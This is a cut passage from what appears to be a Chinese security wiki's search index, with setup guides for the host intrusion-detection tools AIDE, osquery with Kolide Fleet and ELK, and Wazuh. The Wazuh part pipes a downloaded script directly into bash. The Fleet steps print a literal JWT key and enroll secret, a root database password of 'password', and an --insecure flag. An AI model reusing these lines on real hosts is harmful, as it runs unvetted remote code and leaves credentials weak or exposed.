\u57fa\u4e8e\u64cd\u4f5c","title":"\u6839\u636e\u68c0\u6d4b\u7c7b\u578b\u5206\u7c7b"},{"location":"infrastructure-security/host-security/ids-ips/#_5","text":"","title":"\u5f00\u6e90\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b&amp;\u9632\u5fa1"},{"location":"infrastructure-security/host-security/ids-ips/#yulong-hids","text":"\u5b98\u7f51\u5730\u5740 \u53c2\u8003\u8d44\u6599 \u9a6d\u9f99\u5f00\u6e90\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf","title":"yulong-hids"},{"location":"infrastructure-security/host-security/ids-ips/aide/","text":"aide \u6587\u4ef6\u548c\u76ee\u5f55\u5b8c\u6574\u6027\u5165\u7fa4\u68c0\u6d4b AIDE\uff08Advanced Intrusion Detection Environment\uff09\uff1a\u9ad8\u7ea7\u5165\u4fb5\u68c0\u6d4b\u73af\u5883 \u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 aide\u5b89\u88c5 # \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 yum install aide.x86_64 -y aide\u4f7f\u7528 # \u521d\u59cb\u5316\u6570\u636e\u5e93 aide -i # \u5c06\u521d\u59cb\u5316\u6570\u636e\u5e93\u6539\u540d\u4e3a\u9ed8\u8ba4\u6570\u636e\u5e93 mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u68c0\u67e5 aide -C # \u66f4\u65b0\u6570\u636e\u5e93\uff0c\u66f4\u65b0\u5b8c\u6210\u4ee5\u540e\u9700\u8981\u5c06\u65b0\u7684\u6570\u636e\u5e93\u6587\u4ef6\u590d\u5236\u4e3a\u6570\u636e\u5e93 aide -u mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u68c0\u67e5\u914d\u7f6e\u6587\u4ef6 aide -D --config-check \u914d\u7f6e\u6587\u4ef6\u8bf4\u660e vim /etc/aide.conf # \u6587\u4ef6\u5c5e\u6027 p:\u6743\u9650 i:\u8282\u70b9 n:\u94fe\u63a5\u6570 u:\u7528\u6237 g:\u7ec4 s:\u5927\u5c0f S:\u6587\u4ef6\u589e\u957f\u5927\u5c0f b:\u5757\u6570\u91cf m:\u4fee\u6539\u65f6\u95f4 a:\u8bbf\u95ee\u65f6\u95f4 c:\u521b\u5efa\u65f6\u95f4 # \u7f16\u8bd1\u652f\u6301 acl:\u6587\u4ef6\u7684acl\u8bbf\u95ee\u63a7\u5236\u5217\u8868 selinux: xattrs: # \u6458\u8981\u7b97\u6cd5 md5: sha1: sha256: sha512: rmd160: tiger: crc32: whirlpool: haval: gost: aide\u6848\u4f8b \u6bcf\u5929\u6267\u884c\u4e00\u6b21aide\uff0c\u5e76\u5c06\u7ed3\u679c\u53d1\u9001\u5230\u90ae\u7bb1 0 0 * * * /usr/sbin/aide --check | /usr/bin/mail -s AIDE run for $HOSTNAME your@email.com","title":"aide \u6587\u4ef6\u548c\u76ee\u5f55\u5b8c\u6574\u6027\u5165\u7fa4\u68c0\u6d4b"},{"location":"infrastructure-security/host-security/ids-ips/aide/#aide","text":"AIDE\uff08Advanced Intrusion Detection Environment\uff09\uff1a\u9ad8\u7ea7\u5165\u4fb5\u68c0\u6d4b\u73af\u5883 \u5b98\u7f51\u5730\u5740 \u4e0b\u8f7d\u5730\u5740","title":"aide \u6587\u4ef6\u548c\u76ee\u5f55\u5b8c\u6574\u6027\u5165\u7fa4\u68c0\u6d4b"},{"location":"infrastructure-security/host-security/ids-ips/aide/#_1","text":"","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/host-security/ids-ips/aide/#aide_1","text":"# \u64cd\u4f5c\u7cfb\u7edf\uff1aCentos7 yum install aide.x86_64 -y","title":"aide\u5b89\u88c5"},{"location":"infrastructure-security/host-security/ids-ips/aide/#aide_2","text":"# \u521d\u59cb\u5316\u6570\u636e\u5e93 aide -i # \u5c06\u521d\u59cb\u5316\u6570\u636e\u5e93\u6539\u540d\u4e3a\u9ed8\u8ba4\u6570\u636e\u5e93 mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u68c0\u67e5 aide -C # \u66f4\u65b0\u6570\u636e\u5e93\uff0c\u66f4\u65b0\u5b8c\u6210\u4ee5\u540e\u9700\u8981\u5c06\u65b0\u7684\u6570\u636e\u5e93\u6587\u4ef6\u590d\u5236\u4e3a\u6570\u636e\u5e93 aide -u mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz # \u68c0\u67e5\u914d\u7f6e\u6587\u4ef6 aide -D --config-check","title":"aide\u4f7f\u7528"},{"location":"infrastructure-security/host-security/ids-ips/aide/#_2","text":"vim /etc/aide.conf # \u6587\u4ef6\u5c5e\u6027 p:\u6743\u9650 i:\u8282\u70b9 n:\u94fe\u63a5\u6570 u:\u7528\u6237 g:\u7ec4 s:\u5927\u5c0f S:\u6587\u4ef6\u589e\u957f\u5927\u5c0f b:\u5757\u6570\u91cf m:\u4fee\u6539\u65f6\u95f4 a:\u8bbf\u95ee\u65f6\u95f4 c:\u521b\u5efa\u65f6\u95f4 # \u7f16\u8bd1\u652f\u6301 acl:\u6587\u4ef6\u7684acl\u8bbf\u95ee\u63a7\u5236\u5217\u8868 selinux: xattrs: # \u6458\u8981\u7b97\u6cd5 md5: sha1: sha256: sha512: rmd160: tiger: crc32: whirlpool: haval: gost:","title":"\u914d\u7f6e\u6587\u4ef6\u8bf4\u660e"},{"location":"infrastructure-security/host-security/ids-ips/aide/#aide_3","text":"\u6bcf\u5929\u6267\u884c\u4e00\u6b21aide\uff0c\u5e76\u5c06\u7ed3\u679c\u53d1\u9001\u5230\u90ae\u7bb1 0 0 * * * /usr/sbin/aide --check | /usr/bin/mail -s AIDE run for $HOSTNAME your@email.com","title":"aide\u6848\u4f8b"},{"location":"infrastructure-security/host-security/ids-ips/osquery/","text":"osquery \u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u4e0e\u5206\u6790 \u5b98\u7f51\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 \u5b98\u65b9\u5b89\u88c5\u6587\u6863 Centos7\u5b89\u88c5osquery # \u5b89\u88c5yum\u6e90 rpm -ivh https://osquery-packages.s3.amazonaws.com/centos7/noarch/osquery-s3-centos7-repo-1-0.0.noarch.rpm # \u5b89\u88c5 yum install osquery.x86_64 -y # \u914d\u7f6e cp /usr/share/osquery/osquery.example.conf /etc/osquery/osquery.conf # \u542f\u52a8 systemctl start osqueryd # \u6267\u884c osqueryi \u914d\u7f6e\u6587\u4ef6 \u914d\u7f6e\u6587\u4ef6\u5b98\u65b9\u6587\u6863 vim /etc/osquery/osquery.conf options\uff1a\u5305\u542bosquery daemon\u7684\u4e00\u4e9b\u914d\u7f6e schedule\uff1a\u5b9a\u65f6\u6267\u884c\u7684\u4efb\u52a1 decorators\uff1a\u8bb0\u5f55result\u7684\u65f6\u5019\uff0c\u6dfb\u52a0\u989d\u5916\u7684\u4fe1\u606f\u5230decorations\u4e2d packs\uff1a\u7b49\u4ef7\u4e8e\u4e00\u7cfb\u5217schedule\u7684\u96c6\u5408 osquery\u8868 schema\u5b98\u65b9\u6587\u6863 \u5728osqueryi\u547d\u4ee4\u884c\u4e0b\u8f93\u5165.table\u67e5\u770b\u6240\u6709\u8868\u3002 \u8fd4\u56de\u5360\u7528\u5185\u5b58\u6700\u5927\u768410\u4e2a\u8fdb\u7a0b select pid, name, uid, resident_size from processes order by resident_size desc limit 10; \u8fd4\u56de\u6700\u6d3b\u8dc3\u768410\u4e2a\u8fdb\u7a0b select count(pid) as total, name from processes group by name order by total desc limit 10; \u67e5\u770b\u7f51\u7edc\u7aef\u53e3\u7684\u8fdb\u7a0b SELECT DISTINCT process.name, listening.port, listening.address, process.pid FROM processes AS process JOIN listening_ports AS listening ON process.pid = listening.pid; \u67e5\u770b\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757 select name from kernel_modules; \u57fa\u7840\u6848\u4f8b vim /etc/osquery/osquery.conf { options : { config_plugin : filesystem , logger_plugin : filesystem , logger_path : /var/log/osquery }, schedule : { cpu_time : { query : SELECT * FROM cpu_time; , interval : 60 } } } \u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\uff1a tail -f /var/log/osquery/osqueryd.results.log osquery+python \u5b98\u7f51\u5730\u5740 osquery+ELK+Kolide Fleet \u539f\u6587\u5730\u5740 Osquery\uff1a\u57fa\u4e8eSQL\u7684\u4e3b\u673a\u7ba1\u7406\u5de5\u5177\uff1b Kolide Fleet\uff1a\u7528\u4e8e\u63a7\u5236Osquery\u5217\u8868\u7684\u7075\u6d3b\u670d\u52a1\u5668\uff0c\u5141\u8bb8\u6211\u4eec\u6309\u9700\u67e5\u8be2\u591a\u4e2a\u4e3b\u673a\uff0c\u4ee5\u53ca\u521b\u5efa\u67e5\u8be2\u5305\uff0c\u6784\u5efa\u67e5\u8be2\u8ba1\u5212\u4e0e\u7ba1\u7406\u6211\u4eec\u7684\u4e3b\u673a\uff1b Elastic Stack\uff1aELK\u5141\u8bb8\u6536\u96c6\u3001\u5904\u7406\u548c\u53ef\u89c6\u5316\u65e5\u5fd7\u7684\u5de5\u5177\uff1b \u57fa\u4e8eCentos7\u642d\u5efa\u73af\u5883 \u9ed8\u8ba4Osquery\u4e0eELK\u5df2\u7ecf\u5b89\u88c5\u5b8c\u6210\uff0c\u672c\u7bc7\u4e2d\u4e0d\u8d58\u8ff0\u5b83\u4eec\u7684\u5b89\u88c5\u8fc7\u7a0b ELK\u5b89\u88c5 \u5b89\u88c5Kolide Fleet \u5b98\u65b9\u5b89\u88c5\u5730\u5740 # \u5b89\u88c5mysql # \u4e0b\u8f7dyum\u6e90 wget https://repo.mysql.com//mysql80-community-release-el7-1.noarch.rpm # \u5b89\u88c5yum\u6e90 rpm -ivh mysql80-community-release-el7-1.noarch.rpm # \u5b89\u88c5\u6570\u636e\u5e93 yum install mysql-community-server.x86_64 mysql-community-client.x86_64 -y # \u521b\u5efa\u6570\u636e\u5e93 create database kolide; # \u5b89\u88c5redis # \u5b89\u88c5\u6e90 yum install epel-release -y # \u5b89\u88c5redis yum install redis.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl start redis.service # \u5b89\u88c5Fleet # \u4e0b\u8f7d wget https://dl.kolide.co/bin/fleet_latest.zip # \u89e3\u538b unzip fleet_latest.zip 'linux/*' -d fleet # \u62f7\u8d1d\u6267\u884c\u547d\u4ee4\u5230bin\u76ee\u5f55 cp fleet/linux/fleet /usr/bin/fleet cp fleet/linux/fleetctl /usr/bin/fleetctl # \u8fde\u63a5\u6570\u636e\u5e93 /usr/bin/fleet prepare db --mysql_address=127.0.0.1:3306 --mysql_database=kolide --mysql_username=root --mysql_password=password # \u914d\u7f6e\u8bc1\u4e66 openssl genrsa -out /etc/pki/tls/private/server.key 4096 openssl req -new -key /etc/pki/tls/private/server.key -out /etc/pki/tls/certs/server.csr openssl x509 -req -days 366 -in /etc/pki/tls/certs/server.csr -signkey /etc/pki/tls/private/server.key -out /etc/pki/tls/certs/server.cert # \u542f\u52a8Fleet Server # \u521b\u5efa\u65e5\u5fd7\u76ee\u5f55 mkdir /var/log/kolide # \u542f\u52a8\u670d\u52a1 /usr/bin/fleet serve \\ --mysql_address=127.0.0.1:3306 \\ --mysql_database=kolide \\ --mysql_username=root \\ --mysql_password=password \\ --redis_address=127.0.0.1:6379 \\ --server_cert=/etc/pki/tls/certs/server.cert \\ --server_key=/etc/pki/tls/private/server.key \\ --logging_json \\ --osquery_result_log_file=/var/log/kolide/osquery_result \\ --osquery_status_log_file=/var/log/kolide/osquery_status # \u8fd9\u4e2a\u65f6\u5019\u4f1a\u518d\u6b21\u62a5\u9519\u5982\u4e0b\u56fe \u6211\u4eec\u4f7f\u7528\u5b83\u63a8\u8350\u7684--auth_jwt_key /usr/bin/fleet serve \\ --mysql_address=127.0.0.1:3306 \\ --mysql_database=kolide \\ --mysql_username=root \\ --mysql_password==password \\ --redis_address=127.0.0.1:6379 \\ --server_cert=/etc/pki/tls/certs/server.cert \\ --server_key=/etc/pki/tls/private/server.key \\ --logging_json \\ --osquery_result_log_file=/var/log/kolide/osquery_result \\ --osquery_status_log_file=/var/log/kolide/osquery_status \\ --auth_jwt_key=zJ+TKjgtGqCFX6XcF5SmDDsy4BCSReLH # \u6210\u529f\u5982\u4e0b\u56fe # \u8bbf\u95eeWeb\u754c\u9762\u8fdb\u884c\u5b89\u88c5 # https://10.10.10.5:8080/ \u63a8\u9001\u4e3b\u673a\u5230Fleet Server \u5229\u7528Fleet Launcher\u63a8\u9001\u4e3b\u673a \u5b98\u65b9\u6587\u6863 \u4ee5\u4e0b\u64cd\u4f5c\u5728\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u5b8c\u6210\uff0c\u6211\u8fd9\u91cc\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u662f\u540c\u4e00\u53f0\u673a\u5668 # \u4e0b\u8f7d wget https://github.com/kolide/launcher/releases/download/0.5.0/launcher_0.5.0.zip # \u89e3\u538b unzip launcher_0.5.0.zip # \u6267\u884c\uff0c\u6700\u7b80\u5355\u7684\u6a21\u5f0f cd linux/ ./launcher --hostname=localhost:8080 --enroll_secret=OB+ltcnAmEqykZXNthWNRv4qQMh9Rp0b --insecure # \u6267\u884c\u5b8c\u6210\u4ee5\u540e\uff0c\u5728Web\u754c\u9762\u80fd\u770b\u5230\u65b0\u589e\u7684\u4e3b\u673a \u53c2\u6570\u89e3\u91ca\uff1a --hostname:Fleet Server\u4e3b\u673a\u7684\u5730\u5740 --enroll_secret:Fleet Server\u7684\u5bc6\u94a5\uff0c\u5bc6\u94a5\u5730\u5740\u5982\u56fe --insecure:\u65e0\u6548\u7684CA\u8bc1\u4e66\u9700\u8981\u4f7f\u7528\u6b64\u53c2\u6570 \u603b\u7ed3\uff1a Launcher\u63a8\u9001\u8fdb\u7a0b\u4e0d\u80fd\u7ec8\u6b62\uff0c\u4f1a\u5bfc\u81f4Fleet\u63a5\u53d7\u4e0d\u5230\u5ba2\u6237\u7aef\u4fe1\u606f\uff1b \u5229\u7528osquery\u63a8\u9001\u4e3b\u673a \u8fd9\u91cc\u53e6\u5916\u5f00\u4e00\u53f0client\uff0c\u6267\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a # \u521b\u5efa\u5bc6\u94a5 echo 'OB+ltcnAmEqykZXNthWNRv4qQMh9Rp0b' /var/osquery/enroll_secret # \u914d\u7f6e\u8bc1\u4e66\uff0c\u8bc1\u4e66\u4e0b\u8f7d\u4f4d\u7f6e\u5982\u56fe\uff0c\u4e0b\u8f7d\u5b8c\u6210\u540e\u8fdb\u884c\u6539\u540d mv 10.10.10.5_8080.pem /var/osquery/server.pem # \u6267\u884cosqueryd /usr/bin/osqueryd \\ --enroll_secret_path=/var/osquery/enroll_secret \\ --tls_server_certs=/var/osquery/server.pem \\ --tls_hostname=10.10.10.5:8080 \\ --host_identifier=hostname \\ --enroll_tls_endpoint=/api/v1/osquery/enroll \\ --config_plugin=tls \\ --config_tls_endpoint=/api/v1/osquery/config \\ --config_tls_refresh=10 \\ --disable_distributed=false \\ --distributed_plugin=tls \\ --distributed_interval=3 \\ --distributed_tls_max_attempts=3 \\ --distributed_tls_read_endpoint=/api/v1/osquery/distributed/read \\ --distributed_tls_write_endpoint=/api/v1/osquery/distributed/write \\ --logger_plugin=tls \\ --logger_tls_endpoint=/api/v1/osquery/log \\ --logger_tls_period=10 ELK\u5c55\u793a\u65e5\u5fd7 \u521b\u5efa\u4e00\u4e2a\u67e5\u8be2 \u521b\u5efa\u4e00\u4e2apack \u5229\u7528ELK\u89e3\u6790\u5e76\u5c55\u793a\u65e5\u5fd7 vim /etc/logstash/conf.d/fleet.conf input { file { path = [ /var/log/kolide/osquery_result ] codec = json } } output { elasticsearch { hosts = [ 127.0.0.1:9200 ] index = logstash-fleet-%{+YYYY.MM.dd} } } \u53c2\u8003\u8d44\u6599 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u4e4b\u4e3b\u673a\u8d44\u4ea7\u7ba1\u7406\u4e0e\u5206\u6790 Facebook\u5f00\u6e90\u7684\u57fa\u4e8eSQL\u7684\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u548c\u76d1\u63a7\u6846\u67b6:osquery daemon\u8be6\u89e3 Windows \u5e38\u89c1\u914d\u7f6e\u6587\u4ef6\u7f16\u5199","title":"osquery \u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u4e0e\u5206\u6790"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#osquery","text":"\u5b98\u7f51\u5730\u5740","title":"osquery \u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u4e0e\u5206\u6790"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#_1","text":"\u5b98\u65b9\u5b89\u88c5\u6587\u6863","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#centos7osquery","text":"# \u5b89\u88c5yum\u6e90 rpm -ivh https://osquery-packages.s3.amazonaws.com/centos7/noarch/osquery-s3-centos7-repo-1-0.0.noarch.rpm # \u5b89\u88c5 yum install osquery.x86_64 -y # \u914d\u7f6e cp /usr/share/osquery/osquery.example.conf /etc/osquery/osquery.conf # \u542f\u52a8 systemctl start osqueryd # \u6267\u884c osqueryi","title":"Centos7\u5b89\u88c5osquery"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#_2","text":"\u914d\u7f6e\u6587\u4ef6\u5b98\u65b9\u6587\u6863 vim /etc/osquery/osquery.conf options\uff1a\u5305\u542bosquery daemon\u7684\u4e00\u4e9b\u914d\u7f6e schedule\uff1a\u5b9a\u65f6\u6267\u884c\u7684\u4efb\u52a1 decorators\uff1a\u8bb0\u5f55result\u7684\u65f6\u5019\uff0c\u6dfb\u52a0\u989d\u5916\u7684\u4fe1\u606f\u5230decorations\u4e2d packs\uff1a\u7b49\u4ef7\u4e8e\u4e00\u7cfb\u5217schedule\u7684\u96c6\u5408","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#osquery_1","text":"schema\u5b98\u65b9\u6587\u6863 \u5728osqueryi\u547d\u4ee4\u884c\u4e0b\u8f93\u5165.table\u67e5\u770b\u6240\u6709\u8868\u3002 \u8fd4\u56de\u5360\u7528\u5185\u5b58\u6700\u5927\u768410\u4e2a\u8fdb\u7a0b select pid, name, uid, resident_size from processes order by resident_size desc limit 10; \u8fd4\u56de\u6700\u6d3b\u8dc3\u768410\u4e2a\u8fdb\u7a0b select count(pid) as total, name from processes group by name order by total desc limit 10; \u67e5\u770b\u7f51\u7edc\u7aef\u53e3\u7684\u8fdb\u7a0b SELECT DISTINCT process.name, listening.port, listening.address, process.pid FROM processes AS process JOIN listening_ports AS listening ON process.pid = listening.pid; \u67e5\u770b\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757 select name from kernel_modules;","title":"osquery\u8868"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#_3","text":"vim /etc/osquery/osquery.conf { options : { config_plugin : filesystem , logger_plugin : filesystem , logger_path : /var/log/osquery }, schedule : { cpu_time : { query : SELECT * FROM cpu_time; , interval : 60 } } } \u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\uff1a tail -f /var/log/osquery/osqueryd.results.log","title":"\u57fa\u7840\u6848\u4f8b"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#osquerypython","text":"\u5b98\u7f51\u5730\u5740","title":"osquery+python"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#osqueryelkkolide-fleet","text":"\u539f\u6587\u5730\u5740 Osquery\uff1a\u57fa\u4e8eSQL\u7684\u4e3b\u673a\u7ba1\u7406\u5de5\u5177\uff1b Kolide Fleet\uff1a\u7528\u4e8e\u63a7\u5236Osquery\u5217\u8868\u7684\u7075\u6d3b\u670d\u52a1\u5668\uff0c\u5141\u8bb8\u6211\u4eec\u6309\u9700\u67e5\u8be2\u591a\u4e2a\u4e3b\u673a\uff0c\u4ee5\u53ca\u521b\u5efa\u67e5\u8be2\u5305\uff0c\u6784\u5efa\u67e5\u8be2\u8ba1\u5212\u4e0e\u7ba1\u7406\u6211\u4eec\u7684\u4e3b\u673a\uff1b Elastic Stack\uff1aELK\u5141\u8bb8\u6536\u96c6\u3001\u5904\u7406\u548c\u53ef\u89c6\u5316\u65e5\u5fd7\u7684\u5de5\u5177\uff1b","title":"osquery+ELK+Kolide Fleet"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#centos7","text":"\u9ed8\u8ba4Osquery\u4e0eELK\u5df2\u7ecf\u5b89\u88c5\u5b8c\u6210\uff0c\u672c\u7bc7\u4e2d\u4e0d\u8d58\u8ff0\u5b83\u4eec\u7684\u5b89\u88c5\u8fc7\u7a0b ELK\u5b89\u88c5 \u5b89\u88c5Kolide Fleet \u5b98\u65b9\u5b89\u88c5\u5730\u5740 # \u5b89\u88c5mysql # \u4e0b\u8f7dyum\u6e90 wget https://repo.mysql.com//mysql80-community-release-el7-1.noarch.rpm # \u5b89\u88c5yum\u6e90 rpm -ivh mysql80-community-release-el7-1.noarch.rpm # \u5b89\u88c5\u6570\u636e\u5e93 yum install mysql-community-server.x86_64 mysql-community-client.x86_64 -y # \u521b\u5efa\u6570\u636e\u5e93 create database kolide; # \u5b89\u88c5redis # \u5b89\u88c5\u6e90 yum install epel-release -y # \u5b89\u88c5redis yum install redis.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl start redis.service # \u5b89\u88c5Fleet # \u4e0b\u8f7d wget https://dl.kolide.co/bin/fleet_latest.zip # \u89e3\u538b unzip fleet_latest.zip 'linux/*' -d fleet # \u62f7\u8d1d\u6267\u884c\u547d\u4ee4\u5230bin\u76ee\u5f55 cp fleet/linux/fleet /usr/bin/fleet cp fleet/linux/fleetctl /usr/bin/fleetctl # \u8fde\u63a5\u6570\u636e\u5e93 /usr/bin/fleet prepare db --mysql_address=127.0.0.1:3306 --mysql_database=kolide --mysql_username=root --mysql_password=password # \u914d\u7f6e\u8bc1\u4e66 openssl genrsa -out /etc/pki/tls/private/server.key 4096 openssl req -new -key /etc/pki/tls/private/server.key -out /etc/pki/tls/certs/server.csr openssl x509 -req -days 366 -in /etc/pki/tls/certs/server.csr -signkey /etc/pki/tls/private/server.key -out /etc/pki/tls/certs/server.cert # \u542f\u52a8Fleet Server # \u521b\u5efa\u65e5\u5fd7\u76ee\u5f55 mkdir /var/log/kolide # \u542f\u52a8\u670d\u52a1 /usr/bin/fleet serve \\ --mysql_address=127.0.0.1:3306 \\ --mysql_database=kolide \\ --mysql_username=root \\ --mysql_password=password \\ --redis_address=127.0.0.1:6379 \\ --server_cert=/etc/pki/tls/certs/server.cert \\ --server_key=/etc/pki/tls/private/server.key \\ --logging_json \\ --osquery_result_log_file=/var/log/kolide/osquery_result \\ --osquery_status_log_file=/var/log/kolide/osquery_status # \u8fd9\u4e2a\u65f6\u5019\u4f1a\u518d\u6b21\u62a5\u9519\u5982\u4e0b\u56fe \u6211\u4eec\u4f7f\u7528\u5b83\u63a8\u8350\u7684--auth_jwt_key /usr/bin/fleet serve \\ --mysql_address=127.0.0.1:3306 \\ --mysql_database=kolide \\ --mysql_username=root \\ --mysql_password==password \\ --redis_address=127.0.0.1:6379 \\ --server_cert=/etc/pki/tls/certs/server.cert \\ --server_key=/etc/pki/tls/private/server.key \\ --logging_json \\ --osquery_result_log_file=/var/log/kolide/osquery_result \\ --osquery_status_log_file=/var/log/kolide/osquery_status \\ --auth_jwt_key=zJ+TKjgtGqCFX6XcF5SmDDsy4BCSReLH # \u6210\u529f\u5982\u4e0b\u56fe # \u8bbf\u95eeWeb\u754c\u9762\u8fdb\u884c\u5b89\u88c5 # https://10.10.10.5:8080/","title":"\u57fa\u4e8eCentos7\u642d\u5efa\u73af\u5883"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#fleet-server","text":"\u5229\u7528Fleet Launcher\u63a8\u9001\u4e3b\u673a \u5b98\u65b9\u6587\u6863 \u4ee5\u4e0b\u64cd\u4f5c\u5728\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u5b8c\u6210\uff0c\u6211\u8fd9\u91cc\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u662f\u540c\u4e00\u53f0\u673a\u5668 # \u4e0b\u8f7d wget https://github.com/kolide/launcher/releases/download/0.5.0/launcher_0.5.0.zip # \u89e3\u538b unzip launcher_0.5.0.zip # \u6267\u884c\uff0c\u6700\u7b80\u5355\u7684\u6a21\u5f0f cd linux/ ./launcher --hostname=localhost:8080 --enroll_secret=OB+ltcnAmEqykZXNthWNRv4qQMh9Rp0b --insecure # \u6267\u884c\u5b8c\u6210\u4ee5\u540e\uff0c\u5728Web\u754c\u9762\u80fd\u770b\u5230\u65b0\u589e\u7684\u4e3b\u673a \u53c2\u6570\u89e3\u91ca\uff1a --hostname:Fleet Server\u4e3b\u673a\u7684\u5730\u5740 --enroll_secret:Fleet Server\u7684\u5bc6\u94a5\uff0c\u5bc6\u94a5\u5730\u5740\u5982\u56fe --insecure:\u65e0\u6548\u7684CA\u8bc1\u4e66\u9700\u8981\u4f7f\u7528\u6b64\u53c2\u6570 \u603b\u7ed3\uff1a Launcher\u63a8\u9001\u8fdb\u7a0b\u4e0d\u80fd\u7ec8\u6b62\uff0c\u4f1a\u5bfc\u81f4Fleet\u63a5\u53d7\u4e0d\u5230\u5ba2\u6237\u7aef\u4fe1\u606f\uff1b \u5229\u7528osquery\u63a8\u9001\u4e3b\u673a \u8fd9\u91cc\u53e6\u5916\u5f00\u4e00\u53f0client\uff0c\u6267\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a # \u521b\u5efa\u5bc6\u94a5 echo 'OB+ltcnAmEqykZXNthWNRv4qQMh9Rp0b' /var/osquery/enroll_secret # \u914d\u7f6e\u8bc1\u4e66\uff0c\u8bc1\u4e66\u4e0b\u8f7d\u4f4d\u7f6e\u5982\u56fe\uff0c\u4e0b\u8f7d\u5b8c\u6210\u540e\u8fdb\u884c\u6539\u540d mv 10.10.10.5_8080.pem /var/osquery/server.pem # \u6267\u884cosqueryd /usr/bin/osqueryd \\ --enroll_secret_path=/var/osquery/enroll_secret \\ --tls_server_certs=/var/osquery/server.pem \\ --tls_hostname=10.10.10.5:8080 \\ --host_identifier=hostname \\ --enroll_tls_endpoint=/api/v1/osquery/enroll \\ --config_plugin=tls \\ --config_tls_endpoint=/api/v1/osquery/config \\ --config_tls_refresh=10 \\ --disable_distributed=false \\ --distributed_plugin=tls \\ --distributed_interval=3 \\ --distributed_tls_max_attempts=3 \\ --distributed_tls_read_endpoint=/api/v1/osquery/distributed/read \\ --distributed_tls_write_endpoint=/api/v1/osquery/distributed/write \\ --logger_plugin=tls \\ --logger_tls_endpoint=/api/v1/osquery/log \\ --logger_tls_period=10","title":"\u63a8\u9001\u4e3b\u673a\u5230Fleet Server"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#elk","text":"\u521b\u5efa\u4e00\u4e2a\u67e5\u8be2 \u521b\u5efa\u4e00\u4e2apack \u5229\u7528ELK\u89e3\u6790\u5e76\u5c55\u793a\u65e5\u5fd7 vim /etc/logstash/conf.d/fleet.conf input { file { path = [ /var/log/kolide/osquery_result ] codec = json } } output { elasticsearch { hosts = [ 127.0.0.1:9200 ] index = logstash-fleet-%{+YYYY.MM.dd} } }","title":"ELK\u5c55\u793a\u65e5\u5fd7"},{"location":"infrastructure-security/host-security/ids-ips/osquery/#_4","text":"\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u4e4b\u4e3b\u673a\u8d44\u4ea7\u7ba1\u7406\u4e0e\u5206\u6790 Facebook\u5f00\u6e90\u7684\u57fa\u4e8eSQL\u7684\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u548c\u76d1\u63a7\u6846\u67b6:osquery daemon\u8be6\u89e3 Windows \u5e38\u89c1\u914d\u7f6e\u6587\u4ef6\u7f16\u5199","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/ids-ips/wazuh/","text":"wazuh \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf \u5b98\u7f51\u5730\u5740 \u5b98\u65b9\u6587\u6863 \u5b89\u88c5\u4e0e\u4f7f\u7528 wazuh server\u5b89\u88c5 rpm -ivh wazuh-manager-3.3.1-1.x86_64.rpm # \u542f\u52a8\u670d\u52a1 systemctl start wazuh-manager.service systemctl status wazuh-manager.service wazuh api\u5b89\u88c5 \u5b89\u88c5nodejs wget -qO- https://rpm.nodesource.com/setup_8.x | bash - # \u8fd9\u91cc\u7684\u7248\u672c\u4f1a\u5bfc\u81f4\u540e\u9762\u7684\u62a5\u9519 yum install nodejs.x86_64 \u5b89\u88c5python2\uff08Centos7\u9ed8\u8ba4python2\uff09 \u5b89\u88c5wazuh api rpm -ivh wazuh-api-3.3.1-1.x86_64.rpm systemctl start wazuh-api.service systemctl status wazuh-api.service wazuh client\u5b89\u88c5 rpm -ivh wazuh-agent-3.3.1-1.x86_64.rpm # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /var/ossec/etc/ossec.conf # \u5bfc\u5165\u5bc6\u94a5 /var/ossec/bin/manage_agents # \u542f\u52a8\u670d\u52a1 /var/ossec/bin/ossec-control start ELK\u5b89\u88c5 \u5b89\u88c5ElasticSearch # \u5b89\u88c5java yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5es rpm -ivh 